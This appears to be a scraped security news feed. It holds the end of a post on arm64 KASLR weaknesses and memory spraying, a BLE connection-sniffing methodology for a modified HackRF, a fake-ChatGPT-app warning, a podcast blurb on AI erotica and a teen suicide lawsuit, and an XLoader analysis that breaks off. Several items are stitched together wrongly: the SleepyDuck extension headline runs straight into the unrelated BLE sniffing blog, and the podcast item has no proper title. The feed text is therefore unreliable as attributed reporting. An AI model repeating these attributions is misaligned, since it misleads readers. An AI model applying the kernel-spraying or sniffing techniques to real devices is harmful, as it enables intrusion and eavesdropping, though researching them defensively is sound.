The linear mapping memory is even mapped rw for any kernel .data regions. The only consolation that makes using this address slightly less effective than the traditional method of leaking the KASLR slide is that .text regions are not mapped executable - so an attacker cannot use this base for e.g. ROP gadgets or more generally PC control. But oftentimes, a Linux kernel attacker’s goal isn’t arbitrary code execution in kernel context anyway - arbitrary read-write is the more frequently desired primitive.

# Impact on devices with kernel physical address randomization

Even on devices where the kernel location is randomized in the physical address space, linear mapping non-randomization still softens the kernel considerably to attempts at exploitation. This is particularly because techniques that involve spraying memory (either kernel structures or even userland mmap’s!) can land at predictable physical addresses - and those physical addresses are easily referenceable in kernel virtual address space through the linear map. That potentially gives an attacker a methodology for placing kernel data structures or even simply attacker-controlled userland memory at a known kernel virtual address. I created a simple program that allocated (via mmap and page fault) a substantial quantity (~5 GB) of physical memory on a Samsung S23, then used /proc/pagemap to create a list of which physical page frame numbers (pfns) were allocated. I ran this program 100 times (rebooting in between each time), then counted how often each pfn appeared across the 100 execution cycles. The set of pfns and their counts for how often they appeared were then converted into an image where each pfn is represented by a single pixel. The brighter the green of a pixel, the more often that page was attacker controlled, with a white pixel representing a pfn that was allocated every time. A black pixel represents a pfn that was never allocated - often because those pfn numbers are not mapped to physical memory or because they are used every time in a deterministic way. A big thank you to Jann Horn for developing the tool to create this image from the data that I collected.

This data exemplifies the non-homogenous reliability of pfn allocation to userland mappings, albeit on a device that was only just rebooted. There are ranges of pfns that are allocated quite reliably, and other ranges that are quite unreliable (but still occasionally used). For example, here’s a range of pfns surrounding one of the pages that was allocated 100 times in a row. I suspect this sample is representative of the practical reliability of this technique for placing desired data at a known kernel address for at least a newly rebooted device.

While reliability may suffer on a device that hasn’t rebooted in some time, it remains high enough to be inviting to real-world attackers. Being able to place arbitrarily readable and writable data at a known kernel virtual address is a powerful exploitation primitive as an attacker can much more easily forge kernel data structures or objects and, for example, emplace pointers to those objects in heap sprays attacking UAF issues.

# The Prognosis

I reported these two separate issues, lack of linear map randomization, and kernel lands at static physical address in Pixel, to the Linux kernel team and Google Pixel respectively. However both of these issues are considered intended behavior. While Pixel may introduce randomized physical kernel load addresses at some later point as a feature, there are no immediate plans to resolve the lack of randomization of the Linux kernel’s linear map on arm64.

# Conclusion

Three years ago, I wrote on the state of x86 KASLR and noted how “it is probably time to accept that KASLR is no longer an effective mitigation against local attackers and to develop defensive code and mitigations that accept its limitations.” While it remains true that KASLR should not be trusted to prevent exploitation, particularly in local contexts, it is regrettable that the attitude around Linux KASLR is so fatalistic that putting in the engineering effort to preserve its remaining integrity is not considered to be worthwhile. The joint effect of these two issues dramatically simplified what might otherwise have been a more complicated and likely less reliable exploit. While side-channel attacks do impact the long-term viability of KASLR on all architectures, it is notable that Project Zero and the Google Threat Intelligence Groupp have yet to see a hardware side-channel attack for bypassing KASLR on Android in the wild. Additionally, KASLR still plays an important role in mitigating any remote kernel exploitation attempts. It is valuable from a security in-depth perspective to recognize the impact KASLR has on exploit complexity and reliability in real-world scenarios. In the future, we hope to see changes to the Linux kernel linear mapping and memory hot-plugging implementation to make this a less inviting target for attackers. Randomizing the location of the linear map in the virtual address space, increasing the entropy in physical page allocation, and randomizing the location of the kernel in the physical address space are all concrete steps that can be taken that would improve the overall security posture of Android, the Linux kernel, and Pixel.]]></content:encoded></item><item><title>Malicious VSX Extension &quot;SleepyDuck&quot; Uses Ethereum to Keep Its Command Server Alive</title><link>https://thehackernews.com/2025/11/malicious-vsx-extension-sleepyduck-uses.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgsNAYBUN0RQ2z5BWnN5wrHTjB-XMx0nYPvJ5PMwCjxNk6CVExZCv401_jX_vaktwnLz8B3owRjupOCNIH7s2lbATDXkpMWwounrKb1OaiINgihVNcp_Mc17Wt7y2-LJBiEOk04hyphenhyphen6WlNKg76W5-f3fx2SDPtSSHQSO5gPu0E4V5RmzDEH0WcdpmAzXG0iB/s1600/soladity.jpg" length="" type=""/><pubDate>Mon, 3 Nov 2025 18:08:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Cybersecurity researchers have flagged a new malicious extension in the Open VSX registry that harbors a remote access trojan called SleepyDuck.

This makes it the go-to technology for a vast ecosystem of Internet of Things (IoT) devices, including fitness trackers, smart home sensors, medical monitors, and asset tracking tags. From a security and reverse-engineering perspective, the ability to "listen in" on these communications is invaluable. It allows us to understand how devices talk to each other, discover proprietary protocols, and identify potential security vulnerabilities.A Software Defined Radio (SDR) is a radio communication system where components that have been typically implemented in hardware (e.g., mixers, filters, modulators, demodulators) are instead implemented in software on an embedded system. In essence, an SDR acts as a highly versatile digital receiver. It tunes to a wide spectrum of frequencies and streams the raw radio data to a host computer, which can then process it to decode almost any wireless protocol, including BLE.This blog post describes a methodology to sniff BLE communications using a relatively inexpensive SDR such as the .By reading this post, you will learn BLE/SDR basics and how we overcame the three main challenges we encountered:How to handle the difference in transmit power on both ends of the BLE connectionHow to follow the channel hopping despite the USB latency (since we cannot listen to all channels simultaneously)How to deduce the channel hopping scheme without seeing the frame that initiates the connectionWe assume that the reader has some experience in C programming and basic math.Before describing our approach, we will first cover BLE protocol and SDR basics. Please be aware that the information given in this post applies to the BLE 5.0 specifications.The Bluetooth Low Energy protocol is organized in a stack of layers, similar to the OSI model for networking. In this post, we will focus on the , which sits directly on top of the Physical Layer (PHY). The LL is responsible for managing the radio state, including advertising, scanning, and establishing and maintaining connections. It defines the packet structure, channel hopping, and timing that we will be exploring in detail.The BLE link-layer protocol uses up to 40 radio channels, numbered from 0 to 39. Each channel is assigned its own frequency, and there are two types of channels:The  channels (numbered 37, 38, and 39) that serve as connection management (such as discovery and initiating connections)The  channels (numbered 0 to 36) that carry the actual connection data after it's establishedThe devices participating in a BLE connection exchange packets on the various channels. The general structure of a packet is as follows:The general structure of a PDU is as follows:Advertisement PDUs are exchanged on the advertisement channels, and Data PDUs are exchanged on the data channels.A BLE connection involves two roles:The : This is the device that initiates the connection (such as a smartphone or computer)The : This is the service we connect to (such as a smart lightbulb or heart rate sensor)The process of establishing the connection involves three phases:The Peripheral device that wants to accept connections broadcasts  packets at a regular interval (called the ) on the advertising channels in a round-robin fashion (i.e., on channel 37, then 38, then 39, then again 37, and so on).The Central device listens on the advertising channels to pick up  packets.When the Central device receives any  packets from a device it wants to connect to, it replies with a  packet to the  on the same advertising channel.📝  BLE connection establishment between two devicesLet's assume we've already found the Access Address () and the Connection Interval ()...The  packet contains some crucial information required for the subsequent data exchange. Here are the most important ones:The  for the Data PDUs that will be exchanged on the connectionThe  that specifies the interval at which the devices will exchange dataThe , , and  fields that specify the channel hopping schemeThere are two possible algorithms for the channel hopping scheme: is a simple algorithm that must be supported by all devices is a more complex algorithm that is used only when both devices participating in the connection support itIn this blog post, we will focus on  since it is the more widely used in practice.Once the Central and Peripheral devices have established a connection using the advertising channels, they switch to the data channels to exchange application data. This exchange is not a continuous stream but is structured into periodic bursts called . During these events, the devices wake up, exchange one or more data packets, and then go back to sleep to conserve power.In order to maintain a robust connection and avoid interference, BLE employs a channel hopping scheme, meaning the channel used changes for every connection event. Understanding how this data exchange is timed and how the channel hopping sequence is determined is fundamental to successfully sniffing an ongoing connection.Connection timing propertiesIn this section, we will focus on the connection event timings, enabling us to understand the channel hopping in the next section.Recall that the central and peripheral devices exchange packets during , which consist of a sequence of exchanges. Each exchange is initiated by the central device by sending a packet, then the peripheral device replies, then the central device initiates the next exchange, and so on, until the connection event is terminated.The time at which the first packet of a connection event is sent by the central device is called the  of this connection event. The time between two subsequent anchors is determined by the  negotiated in the  packet.There may be a small amount of  affecting the timing of anchors. In that case, the timing of subsequent anchors shall be determined relative to the actual time of the last anchor.📝  Anchors and connection eventsAnchor 2 happens at T + connInterval + smallJitterThen, Anchor 3 will be expected at T + connInterval + smallJitter + connIntervalAt each connection event, the data channel changes. When using  (as we assume), the picked channel depends on the following:The  and the  negotiated at the start of the connectionThe  (incremented at each connection event)The following schema describes the algorithm used to compute the channel number based on the AA and event counter.This section will cover SDR basics. Readers interested in more details are encouraged to read the excellent PySDR tutorials.The SDR listens to radio waves and converts them into a format that can be handled by the host, in a process called  that we will describe in more detail in the following section.The SDR device is commanded by the host (your PC) that instructs it to "tune" to an arbitrary frequency (called the ).Once the SDR is tuned to a frequency, it listens to the radio waves around that frequency and provides the host a stream of I and Q integer values, sampled at a specific interval (called the ).The core mechanism of the IQ sampling is taking this "raw" radio wave and converting it into the stream of IQ values.Joseph Fourier tells us that any signal can be represented as a sum of sine waves. To illustrate the concept, we will provide some examples of IQ sampling with radio sine waves to get the idea of what is done.A sine wave is characterized by its  (i.e., the frequency at which the signal "repeats itself"), its  (i.e., the "strength" of the signal), and its  (i.e., the time-shift relative to a pure sine wave).In order to do the IQ sampling, the SDR generates two sine wave signals:The  signal, which is a sine wave at the SDR's tuned frequencyThe  signal, which is the same sine wave as the  signal, except it's time-shifted by a quarter of a period (i.e., it "lags" behind the in-phase signal by 90°)For mathematical reasons, any sine wavecan be expressed as:But how areandrelated to? Let's make a few sample signals to find out.📝  The case where S(t) is exactly equal to the  signal. Relative to the  signal, the phase of S(t) is 0.In this example,, so in the context of,and.📝  The case where S(t) is a sine wave like the  signal, except it "leads" the  signal by 90°. Relative to the  signal, the phase of S(t) is 90° (or, in radians).In that example,(note the minus sign, since S(t) "leads" the in-phase signal, while the quadrature-phase "lags" behind the in-phase signal), so in the context of,and.We can imaginebeing a vector in the plane (with I being associated to the horizontal axis). Looking at these two examples, we see that the angle of the vector [I,Q] (relative to the horizontal axis) represents the phase of S(t), while its length represents the amplitude:In the first example, I=1 and Q=0, so the angle of [I,Q] is 0, which corresponds to the phase of S(t). The amplitude is 1, which also corresponds to the amplitude of S(t).In the second example, I=0 and Q=1, so the angle of [I,Q] is 90°, which corresponds to the phase of S(t). The amplitude is 1, which also corresponds to the amplitude of S(t).Based on these two simple examples, we have an intuition for the rule. It turns out that this generalizes to any amplitude and phase. This vector representation ofon the plane is called the  diagram.As we see, a radio sine wave at exactly the same frequency as the SDR tuning frequency will be represented by a  vector, whose angle and length represents the phase and amplitude of the sine wave.But what happens if our radio wave is a sine wave not exactly at the SDR tuned frequency? Let's say that our radio wave is a sine at frequency. The intuition here is that a shift in frequency can be thought of as a . Indeed, our phasor will "spin" in the positive (counter-clockwise) direction at a rate ofturns per second like this:Conversely, if the radio wave frequency is less than the SDR tuning frequency, the phasor will "spin" in the negative direction, with a speed proportional to the frequency difference.Now, we see that the IQ samples (and the phasor) contain all the information we need about the signal:Its  (the angle of the vector relative to the horizontal axis)Its  (the length of the vector)Its  to the SDR tuned frequency (the "spinning" speed)The SDR can capture a wide range of frequencies around its center frequency. When listening to a specific signal, we will tune our SDR to the frequency of this signal, but other signals may be present in the captured frequency range, polluting our data.For this reason, we usually apply a  to our IQ data to keep only the signals around the center frequency (we use a low-pass filter and not a pass-band filter, because recall that due to IQ sampling, a signal with the exact same frequency as the SDR center frequency will appear in the IQ data as a frequency of 0, i.e., a DC offset).The low-pass filter is some kind of moving-average on the IQ data that smoothes out the fast variations (corresponding to signals too distant from our center frequency) and keeps the signal that we need to focus on.📝  Filtering IQ signalListening on multiple channels simultaneously (aka: the "Super-power" of the SDR)We have already seen that the SDR listens to a wide range of frequencies around its center frequency. This is why we need filtering to eliminate other conflicting signals in the frequency range.But what if that could be used to our advantage? During BLE sniffing, due to channel hopping, it would be useful to be able to listen to multiple Bluetooth channels simultaneously. It turns out that this is possible, as long as all the channels are in the correct frequency range around the center frequency.Suppose our SDR is tuned to the frequency of 1000Hz (this is not a realistic value, but it is used in our example for the sake of simplicity). We record some IQ data, and we know that on this data there is a signal at 1001Hz.How do we listen to this 1001Hz signal without having to physically tune the SDR at 1001Hz? We will need to post-process our IQ data to get IQ data similar to what would have been obtained if the SDR was tuned at 1001Hz.Recall that, because the signal is at 1001Hz and our tuned frequency is at 1000Hz, the phasor obtained from the IQ data will "spin" at a rate of 1 turn per second in the positive direction (counter-clockwise).What would have been the phasor if the SDR was tuned to 1001Hz? It would be a constant vector. Therefore, to perform this kind of "software tuning", we will need to take our raw IQ data and apply a time-variant rotation of 1 turn per second in the  (clockwise). This corresponds to a frequency shift. The resulting IQ data will be similar to the data we would have obtained if the SDR was tuned to 1001Hz.In a nutshell, we "correct" in software the phasor rotation caused by the frequency difference to obtain a stable phasor as we would have obtained if we were tuned precisely to its frequency. Only then can we apply the low-pass filter.By this process, we see that from the same recorded IQ data, we can extract signals at various frequencies around our center frequency by:Applying a frequency shift to the data to "center" around our target signalApplying a low-pass filterThe BLE protocol employs GFSK (Gaussian Frequency Shift Keying) modulation, which is a kind of frequency modulation. Bits are transmitted at a fixed rate of 1 MHz, and the signal frequency determines the value of the bit: a signal frequency higher than the central frequency represents a 1, while a lower frequency represents a 0.In order to demodulate the signal (i.e., extract the 0s and 1s from the IQ data), we will first need to recover the frequency of the signal at each point in time. Recall that the frequency is simply the phase variation, so to compute the frequency at time T, we will need to compare (subtract) the phase at time T and at time T+1.The following figure shows the demodulation of a simple signal.We can see that to have a clear demodulation, we will need to sample the frequency curve precisely at the center of each bit. In order to find out precisely the centers of the bits, we will use the preamble. The general idea is to pre-compute an ideal preamble template and find out at which point in time the preamble template is the most similar possible to our incoming signal.📝  Preamble detectionThe following figure shows this process, we see that the maximum correlation is at the actual preamble start, at T=6.Once this is done, we can decode each bit by looking at the frequency at the center of the symbol.The  is a popular and affordable open-source SDR device. Its key appeal lies in its wide frequency range and its completely open-source design, covering both the hardware and the firmware. This openness allows researchers to not only use the device for a vast range of applications, but also to modify its firmware to implement custom features, a capability we leverage heavily in our approach.The HackRF can listen to signals in frequencies from 1 MHz to 6 GHz, but works best in the range 2 GHz-2.8 GHz, which is great because the BLE frequencies are in it.The IQ sampling rate and maximum bandwidth is 20 MHz. This means that we can listen simultaneously to multiple signals around our center frequency, from [center - 10 MHz] to [center + 10 MHz].There are three RX gain parameters that can be modified: , , and  gain. The RF and LNA gain operate right after the signal is received, but the VGA gain operates after converting the signal to IQ, just before the sampling.Later in this post, we will see how we implemented the AGC (Automatic Gain Control) in the HackRF firmware.The HackRF interacts with the Host using a  interface. There is a USB endpoint to perform control operations (such as setup, setting frequency, gain, and so on), and two bulk USB endpoints to carry respectively received and transmitted IQ samples.The HackRF employs an ARM processor with two cores,  and . The M0 core is dedicated to handling the IQ data flow. It spends its time moving IQ data between the transceiver and a shared buffer with the M4. The M4 core runs the rest of the firmware.The HackRF uses a  Analog Front-End and sends commands to it with .While the theory of BLE and SDRs provides a solid foundation, applying it to real-world sniffing presents a number of practical challenges that can quickly derail any attempt to capture a full communication. These problems stem from the physical realities of radio transmission, the performance limitations of a host-controlled SDR, and the stateful nature of the BLE protocol itself. In the following sections, we will detail the three main obstacles we needed to overcome.When sniffing the BLE connection between a central and peripheral devices, transmit power can vary a lot: the signal strength from the central device may be high, while the signal strength from the peripheral device may be low.Setting a low gain will enable capturing the packets from the phone correctly, but the packets from the peripheral devices will have an insufficient signal strength. Conversely, if we set a high gain, we will be able to correctly capture peripheral device packets, but phone packets will be clipped/distorted, impairing the demodulation process.Attempting to adjust the gain once the beginning of the packet is received using the USB interface will be too slow, due to the USB command latency.Channel switching latencyThe BLE protocol employs channel hopping at a fast rate. Attempting to follow the channel hopping from the host by sending commands to the HackRF via the USB interface would be too slow, again due to the USB command latency.Sniffing advertisement channelsThe BLE advertising channels are 37, 38, and 39. The frequencies of these channels are too far apart (> 20 MHz) for HackRF to be able to listen to more than one of them at the same time. Since the  packet can happen on any of the advertising channels, we will probably miss it and fail to catch the required parameters (notably, the Access Address that is required to compute the channel hopping).This section present the solutions to three challenges we encountered.Firmware-based Automatic Gain Control (AGC)The disparity in signal strength was tackled by the implementation of an Automatic Gain Control (AGC) to automatically adjust the input gain based on signal strength. In order to have a fast AGC, it needed to be implemented in the time-critical receive loop of the HackRF's firmware, thus entirely bypassing the high-latency USB connection.Unlike traditional continuous AGCs that constantly adapt the gain based on signal power, this implementation uses a one-shot approach triggered only when a packet is detected.The reason is simple: if the AGC keeps running during idle periods, it ends up amplifying noise, which leads to saturation and clipping as soon as a real packet arrives. Once the receiver is clipped, it’s impossible to estimate the correct gain in time for decoding. By freezing the gain during idle and only adjusting it at the start of a packet, the AGC can directly compute and apply the correct gain level so that the signal is stable as soon as possible.Let's now focus on the implementation details, by diving into the firmware function that handles the receiving mode:This code runs on the M4 core, but the  buffer and  struct are shared with the M0 core. The M0 core fills up the buffer by blocks of 32 bytes at a time, and increments  accordingly. When there is sufficient data () the data is sent to the host via USB bulk transfer.In order to have a fast AGC, it needs to be implemented in this loop, and executed on the M4 core. It cannot be executed on the M0 core since this core is too much time-constrained to be able to do any other thing besides copying IQ data.The AGC will need to start as fast as possible, so we will need to process each 32-byte block and feed it to the AGC function, so we insert this code at the start of our  loop:The  function repeats this process for each received packet:Sets the VGA gain to a baseline (low) value.Detect idle noise power level, and track it using a rolling averageWhen there is an increase in power such that the SNR is over a defined threshold, detects the start of a packet.Measure the power at the start of the packet, and use it to compute the optimal VGA gainApply the computed VGA gain, and update the noise power level under that new gain.When the SNR falls under a defined threshold, detects the end of a packet, and reset the VGA gain to the baseline value.In order to make the AGC more reactive, we also increased the SPI clock frequency in the HackRF firmware. The following picture shows the effect of the AGC, increasing the power when a packet is detected. The AGC takes effect a little after the beginning of the preamble, leaving ample opportunity to decode the packet.This firmware-implemented AGC significantly improves the signal power range of packets that can be detected and processed correctly.Frequency change schedulingIn order to follow the BLE channel hopping, the frequency change command using the USB interface will not do, due to USB latency and jitter. We also can't implement the whole channel hopping algorithm into the firmware due to performance constraints.Fortunately, the host that implements the BLE channel hopping knows in advance when to change the frequency. The solution is to implement a scheduled frequency change USB command that allows the host to tell the HackRF to change the frequency at a specific sample. This way, the host can schedule in advance the frequency changes necessary for BLE channel hopping.This will have to be implemented in firmware, in the same  function as the AGC.First, we will have to implement an USB command to allow the host to schedule a frequency change:Then we will need to add this to the  loop:With this new USB command, the  acquires the capability of executing frequency changes at precise, future sample counts.Deducing channel hopping stateIn our typical use case, we want to sniff an established BLE connection without having captured the  packet. This is due to two reasons:We may start the sniffing process as the connection is already establishedThe HackRF bandwidth does not allow us to listen simultaneously on all advertising channels, so there is a high probability that we will miss the  packet even if we started the sniffing process before the connection is established.Recall that the channel is changed at each connection event, and that the time between two connection events is called the . The channel used for a specific connection event depends on three parameters:The , also sent in the  packet, specifying the set of data channels in use on this connection. For the sake of simplicity, we will consider that the connection uses all data channels, which is a realistic hypothesis.The  of the connection (sent in the  packet)The  (i.e., the number of connection events from the start of the connection, before the current connection event)The Access Address follows the preamble in each data packet, so it can be sniffed once we capture any packet belonging to the connection. However, the connection event counter is a hidden state (known by the central and peripheral devices) that is never sent, and must be deduced.Our approach is based on a process of elimination, similar to a sieve. The general idea to deduce the counter is to listen on a wide number of channels (the HackRF, given its bandwidth, can listen simultaneously on 6 data channels) and try to sniff connection events. We begin with the entire space ofpossible counter states, each observed packet acts as an oracle, enabling us to eliminate a large number of incorrect states.Each time we observe a connection event, based on the channel and time at which the connection event was observed, we remove from the set each counter value that is incompatible with this observation. We repeat the process until there is only one value in the set.Once this value is known, we can follow precisely the channel hopping of the BLE connection.📝  Recovering the counter valueLet's say that we observe the start of a connection event at time T=0sec on channel 1, and that the connection interval issec. Sniffing the connection event also allows us to get the access address. Given the access address, we can fully determine the channel based on the counter.Now, let's try to narrow down the possible counter values for this connection event:Assuming a counter value of 0, the channel is 5 (incompatible)Assuming a counter value of 1, the channel is 15 (incompatible)Assuming a counter value of 2, the channel is 1 (compatibe!)Assuming a counter value of 3, the channel is 23 (incompatible)Assuming a counter value of 4, the channel is 1 (compatible!)Assuming a counter value of 5, the channel is 9 (incompatible)Now, we know that the counter value for this connection event is certainly not 0, 1, 3, or 5 (and so on). The set of possible counter values is refined as:Let's assume that we observe the next connection event atsec on channel 4. Based on the time elapsed since our previous observed connection event, we can say that. Indeed, that means that between our two observed connection events, another connection event occurred (and was probably missed because it was outside our frequency range). For the needs of our example, let us suppose that this missed connection event occurred on channel 7:It means that, based only on the information gathered from the previous connection event, the set of possible counter values for the current connection event isNow, let us refine again our set of possible values:Assuming a counter value of 4, the channel is 29 (incompatible)Assuming a counter value of 6, the channel is 4 (compatible!)We have successfully eliminatedfrom the current possible counter value set, and the set is nowThis process is repeated until there is only one value in the set.To demonstrate this approach, we will configure a BLE Peripheral device on a phone and a BLE Central device on a laptop.For the BLE Peripheral device, we need to install  on an Android phone, then configure an advertiser and a GATT server with a readable characteristic.The BLE Central device is a laptop using the Python  module.The BLE physical layer supports multiple modes:Our tool supports only  for now, so we will need to use  to force the use of this mode:# btmgmt

Then, we will need a sample client Python program (using the  Python module) to connect to our server:Intercepting the connectionFirst, we launch the BLE Client (we can detect the MAC address by doing a scan with any tool):$ ./ble_client.py 65:13:3A:CE:DA:EB
Connected to 65:13:3A:CE:DA:EB

Once the connection is established, we launch our tool to sniff the connection:$ ./bluesniff -p capture.pcap -w samples -c 5 -b -l 30 -g 10 -W 6 -o -v -d -A 
: Capture L2CAP data packets to a pcap file: Record IQ samples to a file: Set the main listening channel to 5: Set LNA gain to 30: Set VGA gain to 10: Also listen on 6 channels around the main channel (i.e., channels 2, 3, 4, 6, 7, 8 in addition to 5) while resolving counter init value: Enable connection tracking / channel hopping: Enable verbose and debug output: Enable AGC in the firmwareIt is also possible to specify the Access Address corresponding to the connection we want to sniff using the  option. If it is omitted, the tool will try to guess the Access Address and sniff the first connection available.Here is a demo video showing the tool in action: it sniffs channels from 2 to 8, quickly recovers the channel hopping counter value, and tracks the connection (the only option that was added for the demo is the  due to the noisy test environment):The resulting packets are written to the pcap capture file, which can be opened in Wireshark:In this post, we have detailed a complete methodology for sniffing BLE connections using a HackRF One, overcoming the significant challenges of near/far power disparities, channel hopping latency, and missing initial connection parameters. By modifying the HackRF firmware to implement a fast AGC and a scheduled frequency change mechanism, and by using a logical process to deduce the connection state, we transformed a general-purpose SDR into a powerful, specialized BLE analysis tool.Discussion on strengths and limitationsThe approach to recover the hopping state by observing packets of an existing connection is not new, it has been done in the excellent BTLEJACK approach by Damien Cauquil, using hardware (non-SDR) radio. In this blog post, we replicated some of the BTLEJACK features using a software-defined radio.Using an SDR to perform this approach has a number of advantages:The SDR is able to sniff multiple channels at once (in our experience with HackRF, we were able to sniff up to 7 BLE channels simultaneously before running into signal quality problems). This greatly reduces the length of the hopping state recovery phase, since we are able to sniff more packets (the video demo shows that it takes 1 to 2 seconds to lock onto a connection). This also helps with managing the clock drift since the time between two packet captures will be smaller.Since all the signal processing is implemented in software, it is easy to add support for new versions of the BLE specifications (for example, new PHYs) without having to modify the hardware.Despite this, we acknowledge the following limitations, some of them could be mitigated by future work:The most prominent limitation is the incompressible time delay for reacting to a signal and applying the gain. Even if doing it in the firmware is very fast compared to doing it on the host via USB, it is still several dozen microseconds. Since the AGC needs to react very fast, it limits the number of gain changes that can be done and limits the acceptable range in signal power. This makes our approach less reliable if there is a large disparity in signal power between both ends of the sniffed connection. This limitation could be worked around by implementing a more specialized and sophisticated AGC that remembers previous packets from the same device (for example, using timing properties) and their power.Another timing limitation is the time delay for switching frequencies, even in the firmware. Since the HackRF One can listen to multiple channels simultaneously, it would be interesting to exploit that fact to reduce the occurrences of frequency switching during the connection tracking phase. Since the channel hopping schedule can be known in advance once the counter value is recovered, one could compute a schedule that minimizes the number of frequency switches while allowing the bandwidth of the HackRF One to cover all the needed channels.The tool supports only  and the new channel selection algorithm (), and does not support connection interval or channel map recovery. These features could be implemented in the future.The capabilities developed here open the door to more advanced security research beyond passive sniffing. The precise timing and control achieved are foundational for active interactions. For instance, one could build upon this work to inject custom packets into an established connection, perform man-in-the-middle attacks, or implement highly targeted jamming to disrupt specific communications selectively. This demonstrates the immense power and flexibility that open-source hardware and firmware provide, enabling researchers to build sophisticated tools tailored to complex security challenges.]]></content:encoded></item><item><title>Attack of the clones: Fake ChatGPT apps are everywhere</title><link>https://www.malwarebytes.com/blog/news/2025/11/attack-of-the-clones-fake-chatgpt-apps-are-everywhere</link><author></author><category>threatintel</category><pubDate>Mon, 3 Nov 2025 16:01:17 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[The mobile AI gold rush has flooded app stores with lookalikes—shiny, convincing apps promising “AI image generation,” “smart chat,” or “instant productivity.” But behind the flashy logos lurks a spectrum of fake apps, from harmless copycats to outright spyware. Spoofing trusted brands like OpenAI’s ChatGPT has become the latest tactic for opportunistic developers and cybercriminals to sell their “inventions” and spread malware.A quick scan of app stores in 2025 shows an explosion of “AI” apps. As Appknox research reveals, these clones fall along a wide risk spectrum: Some unofficial “wrappers” connect to legitimate AI APIs with basic add-ons like ads or themes. These mostly create privacy or confusion risks, rather than direct harm.  Others abuse AI branding just to profit from ads. For example, a DALL·E image generator clone mimicking OpenAI’s look delivers nothing but aggressive ad traffic. Its only purpose: funneling user data to advertisers under the guise of intelligence. Package  is detected by Malwarebytes as Adware.Malware disguised as AI tools: At the extreme, clones like WhatsApp Plus use spoofed certificates and obfuscated code to smuggle spyware onto devices. Once installed, these apps scrape contacts, intercept SMS messages (including one-time passwords), and quietly send everything to criminals via cloud services. WhatsApp Plus is an unofficial, third-party modified version of the real WhatsApp app, and some variants falsely claim to include AI-powered tools to lure users.

Follow these tips to stay safe:Download only from official stores. Stick to Google Play or the App Store. Don’t download apps from links in ads, messages, or social media posts.Check the developer name. Fake apps often use small tweaks—extra letters or punctuation—to look legitimate. If the name doesn’t exactly match, skip it.Read the reviews (but carefully). Real users often spot bad app behavior early. Look for repeated mentions of pop-ups, ads, or unexpected charges. Don’t grant access to contacts, messages, or files unless it’s essential for the app to work.Delete suspicious apps fast. If something feels off—battery drain, pop-ups, weird network traffic—uninstall the app and run a scan.We don’t just report on threats—we remove them]]></content:encoded></item><item><title>Would you sext ChatGPT?

On October 14, OpenAI CEO Sam Altman said that the “restrictions” that his company previously placed on their flagship product, ChatGPT, would be removed, allowing, perhaps, for “erotica” in the future. “We made ChatGPT pretty restrictive to make sure we were being careful with mental health issues,” Altman wrote on the platform X. “We realize this made it less useful/enjoyable to many users who had no mental health problems, but given the seriousness of the issue we wanted to get this right.”This wasn’t the first time that OpenAI or its executive had addressed mental health. On August 26, OpenAI published a blog titled “Helping people when they need it most,” which explored new protections for users, including stronger safeguards for long conversations, better recognition of people in crisis, and easier access to outside emergency services and even family and friends. The blog alludes to “recent heartbreaking cases of people using ChatGPT in the midst of acute crises,” but it never explains what, explicitly, that means. But on the very same day the blog was posted, OpenAI was sued for the alleged role that ChatGPT played in the suicide of a 16-year-old boy. According to chat logs disclosed in the lawsuit, the teenager spoke openly to the AI chatbot about suicide, he shared that he wanted to leave a noose in his room, and he even reportedly received an offer to help write a suicide note.Bizarrely, this tragedy plays a role in the larger story, because it was Altman himself who tied the company’s mental health campaign to its possible debut of erotic content. “In December, as we roll out age-gating more fully and as part of our ‘treat adult users like adults’ principle, we will allow even more, like erotica for verified adults.”What “erotica” entails is unclear, but one could safely assume it involves all the capabilities currently present in ChatGPT, through generative chat, of course, but also image generation.   Today, on the Lock and Code podcast with host David Ruiz, we speak with Deb Donig, on faculty at the UC Berkeley School of Information, about the ethics of AI erotica, the possible accountability that belongs to users and to OpenAI, and why intimacy with an AI-power chatbot feels so strange.“A chat bot offers, we might call it, ‘intimacy’s performance,’ without any of its substance, so you get all of the linguistic markers of connection, but no possibility for, for example, rejection. That’s part of the human experience of a relationship.”Tune in today to listen to the full conversation.

Its code decrypts only at runtime and is protected by multiple layers of encryption, each locked with a different key hidden somewhere else in the binary. Even sandboxes are no help: evasions block malicious branches, and the real C2 (command and control) domains are buried among dozens of fakes. With new versions released faster than researchers can investigate, analysis is almost always a (losing) race against time.Generative AI flips the balance. Instead of spending days on painstaking manual analysis and writing decryption routines and reverse-engineering scripts by hand, researchers can now use AI to examine complex functions, identify algorithms, and generate working tools in just hours, accelerating the path to decrypted code, strings, and IoCs.Check Point Research (CPR) demonstrated a new way to use ChatGPT for malware analysis directly from the web interface. By exporting IDA data and analyzing it in the ChatGPT cloud, we showed that deep static reverse engineering with AI is possible without relying on Model Context Protocol (MCP) or a live disassembler session. This approach not only removes the dependency on local heavy tooling, but also makes the results reproducible, easier to share, and more collaborative across research teams.In this research we use a fresh XLoader 8.0 sample to demonstrate how cloud-based static analysis with ChatGPT can be combined with MCP for runtime key extraction and live debugging validation. We documented the time spent on key tasks and included real prompt examples, showing how the workflow progresses from unpacking a fully encrypted binary to recovering hidden C2 domains.XLoader is a widely observed malicious loader with information-stealing capabilities. It first surfaced in 2020 as a rebrand of the FormBook code base, a well-known and capable information stealer, and has since undergone substantial hardening and feature growth. In addition to the Windows variant, its developers also marketed a macOS build, though it appears far less prevalent in the wild.XLoader is a prime example of malware that is extremely difficult to analyze. It combines several layers of protection: customized encryption with additional mixing steps, encrypted blocks disguised as valid but meaningless assembly code, obfuscated API calls, injections into system processes, and a wide set of sandbox evasion techniques. In addition, XLoader encrypts its network traffic, and hides real C2 addresses among dozens of decoys and fake domains.An important feature of XLoader is its ongoing development. The authors release new versions regularly, changing internal mechanisms beyond recognition and adding new anti-analysis methods. As a result, previous research quickly becomes outdated. In earlier versions, extracting the configuration required pulling out a few keys using intricate algorithms. At the same time, obtaining the decrypted data only required peeling off two layers of obfuscation and encryption. Version 5 introduced a built-in packer, and in versions 6 and 7 analysts had to work through dozens of chained functions that decrypt each other, extracting intermediate keys at every stage. For someone new to XLoader, the entry barrier has become very high: on top of the analysis itself, extra time is needed for onboarding. By the time one research cycle is completed, the next iteration of the malware may already be out – and if there are significant changes, another time-consuming investigation is required.When we began this research, XLoader version 8.0 had just been discovered. It seemed the XLoader developers were 